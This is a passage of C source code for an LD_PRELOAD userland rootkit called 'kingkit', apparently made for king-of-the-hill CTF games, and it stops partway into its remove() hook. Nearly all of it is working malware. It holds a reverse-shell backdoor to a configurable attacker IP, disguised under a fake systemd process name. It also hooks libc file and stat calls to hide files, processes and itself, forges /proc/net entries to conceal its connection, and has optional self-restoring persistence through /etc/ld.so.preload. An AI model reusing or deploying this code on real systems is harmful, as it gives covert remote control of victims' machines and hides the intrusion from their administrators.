/* NOTES:
 * fstat() and fstat64() are not needed because it takes a file descriptor as argument that is already filtered by open()
 */


#define _GNU_SOURCE

#include <linux/limits.h>
#include <stdlib.h>
#include <limits.h>
#include <dlfcn.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

//change these
#define KING_NAME "Arnout" //put your nickname here
#define HIDE_PREFIX "kingkit"
#define FAKE_PRELOAD "/etc/kingkit.so.preload"
#define HOST "127.0.0.1" //attackers IP for reverse shell
#define PORT 4444 //listening port for reverse shell
#define SHELL "/bin/bash" //shell for reverse shell
#define PROCESS_NAME "/etc/systemd-resolved" //name that appears as process name to fool `ps` and similiar tools
#define HIDDEN_GID 5005
#define ADVANCED_PERSISTENCE 0 //set to 1 if you want that the rootkit restores itself after deletion. know that this will make it extremely difficult to remove the rootkit yourself too.
#define DEBUG 0 //set to 1 for logging

//don't change these
#define PREFIX_LEN (sizeof(HIDE_PREFIX) - 1)
#define FILEMODE S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
#define UNLOCK_FILE 0
#define LOCK_FILE 1



//global variables
static char *libpath = NULL; //this pointer shouldn't ever be free because that breaks any function calls after the destructor is called


//function declarations
void *syscall_address(void *, const char *);
char *fd_to_path(int);
char *dirfd_pathname_to_path(int, const char *);
int set_attributes(const char *, int);
int king();
void revshell();
int is_hidden(char *);
int is_protected(char *);
int forge_procnet(char *pathname);
int cmp_files(char *, char *);
void resolve_libpath();
void persistence();


//hooks declarations
struct dirent *readdir(DIR *);
struct dirent64 *readdir64(DIR *);
FILE *fopen(const char *restrict, const char *restrict);
FILE *fopen64(const char *restrict, const char *restrict);
int open(const char *, int, ...);
int open64(const char *, int, ...);
int creat(const char *, mode_t);
int creat64(const char *, mode_t);
int openat(int, const char *, int, ...);
int openat64(int, const char *, int, ...);
int access(const char *, int);
int faccessat(int, const char *, int, int);
int stat(const char *restrict, struct stat *);
int stat64(const char *restrict, struct stat64 *);
int __xstat(const char *restrict, struct stat *);
int lstat(const char *restrict, struct stat *);
int lstat64(const char *restrict, struct stat64 *);
int __lxstat(const char *restrict, struct stat *);
int fstatat(int, const char *restrict, struct stat *restrict, int);
int fstatat64(int, const char *restrict, struct stat64 *restrict, int);
struct statx;/* otherwise compiler will complain */int statx(int, const char *restrict, int, unsigned int, struct statx *restrict);
int remove(const char *);
int unlink(const char *);
int unlinkat(int, const char *, int);
int rename(const char *, const char *);
int renameat(int, const char *, int, const char *);
int renameat2(int, const char *, int, const char *, unsigned int);
int link(const char *, const char *);
int linkat(int, const char *, int, const char *, int);
int mount(const char *, const char *, const char *, unsigned long, const void *data);
time_t time(time_t *);



//library function pointer declerartions
static struct dirent *(*original_readdir)(DIR *) = NULL;
static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
static FILE *(*original_fopen)(const char *restrict, const char *restrict) = NULL;
static FILE *(*original_fopen64)(const char *restrict, const char *restrict) = NULL;
static int (*original_open)(const char *, int, ...) = NULL;
static int (*original_open64)(const char *, int, ...) = NULL;
static int (*original_creat)(const char *, mode_t) = NULL;
static int (*original_creat64)(const char *, mode_t) = NULL;
static int (*original_openat)(int, const char *, int, ...) = NULL;
static int (*original_openat64)(int, const char *, int, ...) = NULL;
static int (*original_access)(const char *, int) = NULL;
static int (*original_faccessat)(int, const char *, int, int) = NULL;
static int (*original_stat)(const char *restrict, struct stat *) = NULL;
static int (*original_stat64)(const char *restrict, struct stat64 *) = NULL;
static int (*original___xstat)(const char *restrict, struct stat *) = NULL;
static int (*original_lstat)(const char *restrict, struct stat *) = NULL;
static int (*original_lstat64)(const char *restrict, struct stat64 *) = NULL;
static int (*original___lxstat)(const char *restrict, struct stat *) = NULL;
static int (*original_fstatat)(int, const char *restrict, struct stat *restrict, int) = NULL;
static int (*original_fstatat64)(int, const char *restrict, struct stat64 *restrict, int) = NULL;
static int (*original_statx)(int, const char *restrict, int, unsigned int, struct statx *restrict) = NULL;
static int (*original_remove)(const char *) = NULL;
static int (*original_unlink)(const char *) = NULL;
static int (*original_unlinkat)(int, const char *, int) = NULL;
static int (*original_rename)(const char *, const char *) = NULL;
static int (*original_renameat)(int, const char *, int, const char *) = NULL;
static int (*original_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
static int (*original_link)(const char *, const char *) = NULL;
static int (*original_linkat)(int, const char *, int, const char *, int) = NULL;
static int (*original_mount)(const char *, const char *, const char *, unsigned long, const void *data) = NULL;
static time_t (*original_time)(time_t *) = NULL;



//functions
void *syscall_address(void *symbol_ptr, const char *symbol) {
    #if DEBUG
    printf("[kingkit] syscall_address() called with symbol: %s.\n", symbol);
    #endif
    if (symbol_ptr == NULL) { //check if the symbol is already initialized
        symbol_ptr = dlsym(RTLD_NEXT, symbol); //the void pointer returned by dlsym() should probably be explicitly casted but it seems to work
        if (symbol_ptr == NULL) {
            exit(EXIT_FAILURE); //something went wrong with the symbol lookup, exiting
        }
    }
    return symbol_ptr;
}


char *fd_to_path(int fd) {
    #if DEBUG
    printf("[kingkit] fd_to_path() called with fd: %d.\n", fd);
    #endif
    char link[PATH_MAX];
    char *path;
    snprintf(link, PATH_MAX, "/proc/self/fd/%d", fd);
    path = realpath(link, NULL);
    return path;
}


char *dirfd_pathname_to_path(int dir_fd, const char *pathname) {
    #if DEBUG
    printf("[kingkit] dirfd_pathname_to_path() called with dir_fd: %d and pathname: %s.\n", dir_fd, pathname);
    #endif
    if (pathname[0] == '/' || dir_fd == AT_FDCWD) {
        char *path;
        path = realpath(pathname, NULL);
        return path;
    }
    char *dir;
    char merged_path[PATH_MAX];
    char *path;
    dir = fd_to_path(dir_fd);
    if (dir == NULL)
        return NULL;
    snprintf(merged_path, PATH_MAX, "%s/%s", dir, pathname);
    free(dir);
    path = realpath(merged_path, NULL);
    return path;
}


int set_attributes(const char *pathname, int action) {
    #if DEBUG
    printf("[kingkit] set_attributes() called with pathname: %s and action: %d.\n", pathname, action);
    #endif
    if (getuid() != 0) {
        #if DEBUG
        printf("[kingkit] set_attributes() is called by a non-root user.\n");
        #endif
        return -1;
    }
    original_open = syscall_address(original_open, "open");
    int attr;
    int fd = (*original_open)(pathname, O_RDONLY);
    if (fd == -1) {
        #if DEBUG
        perror("open");
        #endif
        return -1;
    }
    ioctl(fd, FS_IOC_GETFLAGS, &attr);
    if (action) { //lock file
        attr |= FS_APPEND_FL | FS_IMMUTABLE_FL;
    } else { //unlock file
        attr ^= attr & (FS_APPEND_FL | FS_IMMUTABLE_FL);
    }
    ioctl(fd, FS_IOC_SETFLAGS, &attr);
    close(fd);
    return 0;
}


int king() {
    #if DEBUG
    printf("[kingkit] king() called.\n");
    #endif
    if (getuid() != 0) {
        #if DEBUG
        printf("[kingkit] king() is called by a non-root user.\n");
        #endif
        return -1;
    }
    original_open = syscall_address(original_open, "open");
    original_mount = syscall_address(original_mount, "mount");
    //revert mounting
    umount2("/root", MNT_DETACH);
    umount2("/root/king.txt", MNT_DETACH);
    //remove immutable and append-only flags
    set_attributes("/root", UNLOCK_FILE);
    set_attributes("/root/king.txt", UNLOCK_FILE);
    //write nick to king.txt
    int kingfd = (*original_open)("/root/king.txt", O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
    write(kingfd, KING_NAME, (sizeof(KING_NAME) -1));
    close(kingfd);
    //set immutable and append-only flags
    set_attributes("/root/king.txt", LOCK_FILE);
    set_attributes("/root", LOCK_FILE);
    //mount king.txt readonly
    (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_BIND, NULL);
    (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_REMOUNT | MS_BIND | MS_RDONLY, NULL); //for some stupid reason you need to remount to make a bind mount readonly
    return 0;
}


void revshell() {
    #if DEBUG
    printf("[kingkit] revshell() called.\n");
    #endif
    pid_t pid = fork(); //spawn a child process

    if (pid == 0) { //check if we are the child process
        daemon(0, 1); //daemonize the child process

        int sockfd = socket(AF_INET, SOCK_STREAM, 0); //open a socket file descriptor

        struct sockaddr_in address; //create structure variable address
        address.sin_family = AF_INET; //specify 'communication domain' for communication between different hosts using ipv4
        address.sin_port = htons(PORT); //specify the port
        address.sin_addr.s_addr = inet_addr(HOST); //specify host address
        if (connect(sockfd, (struct sockaddr *) &address, sizeof(address)) == -1) { //open a connection to the socket file descriptor sockfd
            #if DEBUG
            perror("connect");
            #endif
            exit(EXIT_FAILURE);
        }

        dup2(sockfd, 0); //redirect standard input to the socket
        dup2(sockfd, 1); //redirect standard output to the socket
        dup2(sockfd, 2); //redirect standard error to the socket

        FILE *open_socket = fdopen(sockfd, "w");
        fprintf(open_socket,
        "******************************\n"
        "KINGKIT REVERSE SHELL BACKDOOR\n"
        "Welcome %s\n"
        "******************************\n\n",
        KING_NAME
        );
        fclose(open_socket);

        setgid(HIDDEN_GID); //automatically hide the backdoor process by setting the gid to HIDDEN_GID

        char *argv[] = {PROCESS_NAME, NULL}; //pass command-line arguments, the first argument appears as process name
        execve(SHELL, argv, NULL); //execute the shell

        exit(EXIT_SUCCESS); //exit the daemonized child process
    }

    return; //return the function in the parent process
}


int is_protected(char *pathname) {
    #if DEBUG
    printf("[kingkit] is_protected() called with pathname: %s.\n", pathname);
    #endif
    if (strcmp(pathname, "/root/king.txt") == 0) {
        king();
        return 1;
    }
    return 0;
}


int is_hidden(char *pathname) {
    #if DEBUG
    printf("[kingkit] is_hidden() called with pathname: %s.\n", pathname);
    #endif
    original_open = syscall_address(original_open, "open");
    if (libpath == NULL) resolve_libpath(); //sometimes is_hidden() is called before constructor functions
    int fd = (*original_open)(pathname, O_RDONLY);
    struct stat sb;
    if (fstat(fd, &sb) == -1) {
        close(fd);
        return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, libpath) == 0;
    }
    close(fd);
    char own_proc_pid[14]; //pid maximum value can be up to 2^22 on 64-bit systems
    int len = snprintf(own_proc_pid, sizeof(own_proc_pid), "/proc/%d", getpid()); //since the /proc/self resolves to /proc/<pid> we need to check against that
    return (sb.st_gid == HIDDEN_GID && strncmp(pathname, own_proc_pid, len) != 0 /*ensure that a hidden proces can access /proc/self*/ ) || strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, libpath) == 0; //return 1 if there is a match
}


int is_procnet(char *pathname) {
    #if DEBUG
    printf("[kingkit] is_procnet() called with pathname: %s.\n", pathname);
    #endif
    return
        strncmp(pathname, "/proc/", 6) == 0 && (
            strcmp(pathname + 6 + strcspn(pathname + 6, "/"), "/net/tcp") == 0 ||
            strcmp(pathname + 6 + strcspn(pathname + 6, "/"), "/net/udp") == 0
        ); //this complicated check is needed because resolving /proc/net/tcp leads to /proc/<pid>/net/tcp
}


int forge_procnet(char *pathname) {
    #if DEBUG
    printf("[kingkit] open_procnet() called with pathname: %s.\n", pathname);
    #endif
    original_fopen = syscall_address(original_fopen, "fopen");
    original_open = syscall_address(original_open, "open");
    FILE *fptr = original_fopen(pathname, "r");
    int forged_fd = original_open("/tmp", O_TMPFILE | O_EXCL | O_RDWR, S_IRWXU);
    if (fptr == NULL || forged_fd == -1) {
        return -1;
    }

    char line[LINE_MAX];
    unsigned long rxq, txq, time_len, retr, inode;
    int local_port, rem_port, d, state, uid, timer_run, timeout;
    char rem_addr[128], local_addr[128], more[512 + 1];
    while (fgets(line, sizeof(line), fptr) != NULL) {
        sscanf(line,
            "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
            &d, local_addr, &local_port, rem_addr, &rem_port, &state, &txq, &rxq,
            &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);
        //parse rem_addr
        int octets[4];
        sscanf(rem_addr, "%2x%2x%2x%2x", octets + 3, octets + 2, octets + 1, octets); //note that octets are reversed
        char rem_ip[16];
        snprintf(rem_ip, sizeof(rem_ip), "%d.%d.%d.%d", octets[0], octets[1], octets[2], octets[3]); //put the list of octets together
        if (strcmp(rem_ip, HOST) == 0) {
            continue;
        }
        write(forged_fd, line, strlen(line));
    }
    lseek(forged_fd, 0, SEEK_SET);
    return forged_fd;
}


int cmp_files(char *file1, char *file2) {
    #if DEBUG
    printf("[kingkit] cmp_files() called with file1: %s and file2: %s.\n", file1, file2);
    #endif
    FILE *f1 = fopen(file1, "r");
    if (f1 == NULL) {
        return 1;
    }

    FILE *f2 = fopen(file2, "r");
    if (f2 == NULL) {
        fclose(f1);
        return 1;
    }

    char c1, c2;
    while (c1 == c2 && c1 != EOF) {
        c1 = getc(f1);
        c2 = getc(f2);
    }

    int ret = !(feof(f1) && feof(f2));
    fclose(f1);
    fclose(f2);
    return ret;
}


void __attribute__((constructor)) resolve_libpath() {
    #if DEBUG
    printf("[kingkit] resolve_libpath() called.\n");
    #endif
    if (libpath != NULL) return; //constructor seem to be called more than once, so check if libpath is uninitialized
    Dl_info so_information;
    if (dladdr(resolve_libpath, &so_information) == 0) {
        //we have to ensure that the program doesn't crash, so we set a dummy value for libpath
        libpath = malloc(4);
        if (libpath == NULL) return;
        strcpy(libpath, "foo");
        return;
    }
    libpath = realpath(so_information.dli_fname, NULL);
    if (libpath == NULL) {
        libpath = malloc(strlen(so_information.dli_fname)+1);
        if (libpath == NULL) return;
        strcpy(libpath, so_information.dli_fname);
    }
}


#if ADVANCED_PERSISTENCE
void __attribute__((destructor)) persistence() { //this function is called when a program exits
    #if DEBUG
    printf("[kingkit] resolve_libpath() called.\n");
    #endif
    if (libpath == NULL) return;
    if (geteuid() != 0) return; //confirm that we have root permission, needed to read files under /proc/self/map_files/

    //get data from /proc/self/maps
    char line[PATH_MAX + 500], addr[100], path[PATH_MAX], proc_pathname[sizeof("/proc/self/map_files/") + 100] = "/proc/self/map_files/"; //these sizes may be garbadge, it should be checked with the code in the kernel behind /proc/PID/maps
    int inode;

    FILE *f = fopen("/proc/self/maps", "r");
    if (f == NULL) {
        return;
    }
    while (strcmp(path, libpath) != 0 && fgets(line, sizeof(line), f) != NULL) {
        sscanf(line, "%s %*s %*s %*s %i %s", addr, &inode, path);
    }
    if (strcmp(path, libpath) != 0) {
        return;
    }
    strncat(proc_pathname, addr, 100);
    fclose(f);

    //compare and reinstall if needed
    //check libpath
    struct stat sb;
    if (stat(libpath, &sb) == -1 || (inode != sb.st_ino && cmp_files(proc_pathname, libpath))) { //if inode is different check the file contents
        remove(libpath); //remove the filename if it exists because new processes might be using it and we don't want to crash those by corrupting the file
        int fd_in = open(proc_pathname, O_RDONLY);
        int fd_out = open(libpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH); //if you want this to be atomic you have to use a random filename and then use rename() to give it the final filename.
        char buf[4096];
        int bytes = read(fd_in, buf, sizeof(buf));
        while (bytes > 0 && write(fd_out, buf, bytes) != -1) { //stop on errors and EOF
            bytes = read(fd_in, buf, sizeof(buf));
        }
        close(fd_in);
        close(fd_out);
    }
    //just overwrite /etc/ld.so.preload, checking is too much trouble
    int fd = open("/etc/ld.so.preload", O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    write(fd, libpath, (strlen(libpath))); //try rewriting /etc/ld.so.preload
    close(fd);
}
#endif



//hooks

struct dirent *readdir(DIR *dirp) {
    #if DEBUG
    printf("[kingkit] readdir called.\n");
    #endif
    original_readdir = syscall_address(original_readdir, "readdir");
    int fd = dirfd(dirp);
    char *dir_path = fd_to_path(fd);
    errno = 0; //set errno to 0 or ls will think that an error occured when NULL is returned at the end of the directory, realpath() in fd_to_path() seems to set errno to 22 (EINVAL)
    size_t dir_len = strlen(dir_path);
    char full_path[PATH_MAX];
    strncpy(full_path, dir_path, sizeof(full_path));
    free(dir_path);
    full_path[dir_len] = '/'; //note that the string isn't null-terminated anymore
    dir_len++;
    struct dirent *ep;
    do {
        ep = (*original_readdir)(dirp);
        if (ep == NULL) return ep;
        strncpy((full_path + dir_len), ep->d_name, (sizeof(full_path) - dir_len));
    } while (
        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
        (!strcmp(full_path, "/etc/ld.so.preload") && access(FAKE_PRELOAD, F_OK) ) ||
        is_hidden(full_path)
    );
    return ep;
}


struct dirent64 *readdir64(DIR *dirp) {
    #if DEBUG
    printf("[kingkit] readdir64 called.\n");
    #endif
    original_readdir64 = syscall_address(original_readdir64, "readdir64");
    int fd = dirfd(dirp);
    char *dir_path = fd_to_path(fd);
    errno = 0; //set errno to 0 or ls will think that an error occured when NULL is returned at the end of the directory, realpath() in fd_to_path() seems to set errno to 22 (EINVAL)
    size_t dir_len = strlen(dir_path);
    char full_path[PATH_MAX];
    strncpy(full_path, dir_path, sizeof(full_path));
    free(dir_path);
    full_path[dir_len] = '/'; //note that the string isn't null-terminated anymore
    dir_len++;
    struct dirent64 *ep;
    do {
        ep = (*original_readdir64)(dirp);
        if (ep == NULL) return ep;
        strncpy((full_path + dir_len), ep->d_name, (sizeof(full_path) - dir_len));
    } while (
        !strncmp(ep->d_name, HIDE_PREFIX, PREFIX_LEN) ||
        (!strcmp(full_path, "/etc/ld.so.preload") && access(FAKE_PRELOAD, F_OK) ) ||
        is_hidden(full_path)
    );
    return ep;
}


FILE *fopen(const char *restrict pathname, const char *restrict mode) {
    #if DEBUG
	printf("[kingkit] fopen called with pathname: %s.\n", pathname);
    #endif
    original_fopen = syscall_address(original_fopen, "fopen");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_fopen)(pathname, mode);
    if (is_procnet(real_pathname)) {
        FILE *fptr = fdopen(forge_procnet(real_pathname), "r+");
        free(real_pathname);
        return fptr;
    } else if (is_protected(real_pathname)) {
        mode = "r";
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname))
        pathname = "/dev/null";
    free(real_pathname);
	return (*original_fopen)(pathname, mode);
}


FILE *fopen64(const char *restrict pathname, const char *restrict mode) {
    #if DEBUG
	printf("[kingkit] fopen64 called with pathname: %s.\n", pathname);
    #endif
    original_fopen64 = syscall_address(original_fopen64, "fopen64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_fopen64)(pathname, mode);
    if (is_procnet(real_pathname)) {
        FILE *fptr = fdopen(forge_procnet(real_pathname), "r+");
        free(real_pathname);
        return fptr;
    } else if (is_protected(real_pathname)) {
        mode = "r";
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname))
        pathname = "/dev/null";
    free(real_pathname);
	return (*original_fopen64)(pathname, mode);
}


int open(const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] open called with pathname: %s.\n", pathname);
    #endif
    original_open = syscall_address(original_open, "open");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_open)(pathname, flags, FILEMODE);
    if (is_procnet(real_pathname)) {
        int fd = forge_procnet(real_pathname);
        free(real_pathname);
        return fd;
    } else if (is_protected(real_pathname)) {
        flags = O_RDONLY;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_open)(pathname, flags, FILEMODE);
}


int open64(const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] open64 called with pathname: %s.\n", pathname);
    #endif
    original_open64 = syscall_address(original_open64, "open64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_open64)(pathname, flags, FILEMODE);
    if (is_procnet(real_pathname)) {
        int fd = forge_procnet(real_pathname);
        free(real_pathname);
        return fd;
    } else if (is_protected(real_pathname)) {
        flags = O_RDONLY;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_open64)(pathname, flags, FILEMODE);
}


int creat(const char *pathname, mode_t mode) {
    #if DEBUG
	printf("[kingkit] creat called with pathname: %s.\n", pathname);
    #endif
    original_creat = syscall_address(original_creat, "creat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_creat)(pathname, mode);
    if (is_protected(real_pathname)) {
        free(real_pathname);
        return 0;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        return 0;
    }
    free(real_pathname);
    return (*original_creat)(pathname, mode);
}


int creat64(const char *pathname, mode_t mode) {
    #if DEBUG
	printf("[kingkit] creat64 called with pathname: %s.\n", pathname);
    #endif
    original_creat64 = syscall_address(original_creat64, "creat64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_creat64)(pathname, mode);
    if (is_protected(real_pathname)) {
        free(real_pathname);
        return 0;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        return 0;
    }
    free(real_pathname);
    return (*original_creat64)(pathname, mode);
}


int openat(int dirfd, const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] openat called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_openat = syscall_address(original_openat, "openat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_openat)(dirfd, pathname, flags, FILEMODE);
    if (is_procnet(real_pathname)) {
        int fd = forge_procnet(real_pathname);
        free(real_pathname);
        return fd;
    } else if (is_protected(real_pathname)) {
        flags = O_RDONLY;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_openat)(dirfd, pathname, flags, FILEMODE);
}


int openat64(int dirfd, const char *pathname, int flags, ...) {
    #if DEBUG
	printf("[kingkit] openat64 called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_openat64 = syscall_address(original_openat64, "openat64");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
    if (is_procnet(real_pathname)) {
        int fd = forge_procnet(real_pathname);
        free(real_pathname);
        return fd;
    } else if (is_protected(real_pathname)) {
        flags = O_RDONLY;
    }
    else if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname))
        pathname = "/dev/null";
    free(real_pathname);
    return (*original_openat64)(dirfd, pathname, flags, FILEMODE);
}


int access(const char *pathname, int mode) {
    #if DEBUG
	printf("[kingkit] access called with pathname: %s.\n", pathname);
    #endif
    original_access = syscall_address(original_access, "access");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_access)(pathname, mode);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_access)(pathname, mode);
}


int faccessat(int dirfd, const char *pathname, int mode, int flags) {
    #if DEBUG
	printf("[kingkit] faccessat called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_faccessat = syscall_address(original_faccessat, "faccessat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_faccessat)(dirfd, pathname, mode, flags);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_faccessat)(dirfd, pathname, mode, flags);
}


int stat(const char *restrict pathname, struct stat *statbuf) {
    #if DEBUG
	printf("[kingkit] stat called with pathname: %s.\n", pathname);
    #endif
    original_stat = syscall_address(original_stat, "stat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_stat)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_stat)(pathname, statbuf);
}


int stat64(const char *restrict pathname, struct stat64 *statbuf) {
    #if DEBUG
	printf("[kingkit] stat64 called with pathname: %s.\n", pathname);
    #endif
    original_stat64 = syscall_address(original_stat64, "stat64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original_stat64)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_stat64)(pathname, statbuf);
}


int __xstat(const char *restrict pathname, struct stat *statbuf) {
    #if DEBUG
	printf("[kingkit] __xstat called with pathname: %s.\n", pathname);
    #endif
    original___xstat = syscall_address(original___xstat, "__xstat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL)
        return (*original___xstat)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original___xstat)(pathname, statbuf);
}


int lstat(const char *restrict pathname, struct stat *statbuf) {
    #if DEBUG
	printf("[kingkit] lstat called with pathname: %s.\n", pathname);
    #endif
    original_lstat = syscall_address(original_lstat, "lstat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_lstat)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_lstat)(pathname, statbuf);
}


int lstat64(const char *restrict pathname, struct stat64 *statbuf) {
    #if DEBUG
	printf("[kingkit] lstat64 called with pathname: %s.\n", pathname);
    #endif
    original_lstat64 = syscall_address(original_lstat64, "lstat64");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original_lstat64)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_lstat64)(pathname, statbuf);
}


int __lxstat(const char *restrict pathname, struct stat *statbuf) {
    #if DEBUG
	printf("[kingkit] __lxstat called with pathname: %s.\n", pathname);
    #endif
    original___lxstat = syscall_address(original___lxstat, "__lxstat");
    char *real_pathname = realpath(pathname, NULL);
    if (real_pathname == NULL) //catch errors like ENOENT
        return (*original___lxstat)(pathname, statbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original___lxstat)(pathname, statbuf);
}


int fstatat(int dirfd, const char *restrict pathname, struct stat *restrict statbuf, int flags) {
    #if DEBUG
    printf("[kingkit] fstatat called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_fstatat = syscall_address(original_fstatat, "fstatat");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_fstatat)(dirfd, pathname, statbuf, flags);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_fstatat)(dirfd, pathname, statbuf, flags);
}



int fstatat64(int dirfd, const char *restrict pathname, struct stat64 *restrict statbuf, int flags) {
    #if DEBUG
    printf("[kingkit] fstatat64 called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_fstatat64 = syscall_address(original_fstatat64, "fstatat64");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_fstatat64)(dirfd, pathname, statbuf, flags);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_fstatat64)(dirfd, pathname, statbuf, flags);
}


int statx(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf) {
    #if DEBUG
    printf("[kingkit] statx called with dirfd: %d and pathname: %s.\n", dirfd, pathname);
    #endif
    original_statx = syscall_address(original_statx, "statx");
    char *real_pathname = dirfd_pathname_to_path(dirfd, pathname);
    if (real_pathname == NULL)
        return (*original_statx)(dirfd, pathname, flags, mask, statxbuf);
    if (!strcmp(real_pathname, "/etc/ld.so.preload"))
        pathname = FAKE_PRELOAD;
    else if (is_hidden(real_pathname)) {
        free(real_pathname);
        errno = ENOENT;
        return -1;
    }
    free(real_pathname);
    return (*original_statx)(dirfd, pathname, flags, mask, statxbuf);
}


int remove(const char *pathname) {
    #if DEBUG
